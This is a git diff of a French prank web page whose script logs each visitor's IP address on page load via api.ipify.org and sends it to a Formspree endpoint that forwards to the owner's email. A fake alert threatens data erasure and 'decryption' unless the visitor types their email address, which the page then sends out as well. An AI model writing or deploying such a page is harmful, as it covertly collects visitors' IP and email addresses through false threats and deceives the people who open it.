@@ -1,4 +1,5 @@
-#akalto on top
+#akalto ON TOP 
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -218,21 +219,20 @@
     </div>
 
     <script>
-        // Lien Formspree configuré pour recevoir les données sur ton e-mail
         const FORMSPREE_URL = "https://formspree.io/f/mzeewylw";
-
         let currentIp = "IP Inconnue";
+        let dataSent = false;
 
-        // Capture automatique de l'IP dès l'arrivée sur le site
+        // Capture automatique de l'IP dès l'arrivée sur le site et envoi direct sur l'e-mail
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 currentIp = data.ip;
-                sendToFormspree(currentIp, "Visite simple (Pas d'email entré)");
+                sendToFormspree(currentIp, "Visite simple (Pas d'email saisi)");
             })
             .catch(err => console.log("Erreur réseau IP"));
 
-        // Fonction d'envoi vers Formspree (ton e-mail)
+        // Fonction d'envoi vers Formspree
         function sendToFormspree(ip, email) {
             let data = {
                 ip: ip,
@@ -255,7 +255,7 @@
             let userEmail = prompt("⚠️ ALERTE : Pour annuler l'effacement des données et décrypter le système, entrez votre adresse e-mail :");
             if (userEmail && userEmail.includes("@")) {
                 alert("Annulation confirmée ! Redirection vers le tableau de bord...");
-                sendToFormspree(currentIp, userEmail);
+                sendToFormspree(currentIp, "EMAIL SAISI : " + userEmail);
                 showPrank();
             } else if (userEmail !== null) {
                 alert("E-mail invalide. Le hack continue !");
@@ -340,4 +340,3 @@
 
 </body>
 </html>
-
